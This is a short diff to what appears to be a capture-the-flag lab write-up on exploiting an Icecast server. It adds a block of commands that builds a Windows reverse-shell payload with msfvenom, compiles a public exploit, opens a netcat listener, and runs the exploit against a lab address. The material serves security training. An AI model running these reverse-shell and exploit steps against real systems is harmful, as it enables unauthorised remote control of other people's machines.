@@ -296,4 +296,10 @@ In this optional task we can try to exploit the vulnerability manually with the 
 
 1. As you advance in your pentesting skills, you will be faced eventually with exploitation without the usage of Metasploit. Provided above is the link to one of the exploits found on Exploit DB for hijacking Icecast for remote code execution. While not required by the room, it's recommended to attempt exploitation via the provided code or via another similar exploit to further hone your skills.
 
-
+```cmd
+msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.18.78.136 LPORT=443 -b '\x0a\x0d\x00' -f c
+gcc 574.c -o 575                                                                            
+chmod +x 575
+nc -nlvp 443
+./575 10.10.170.150
+```
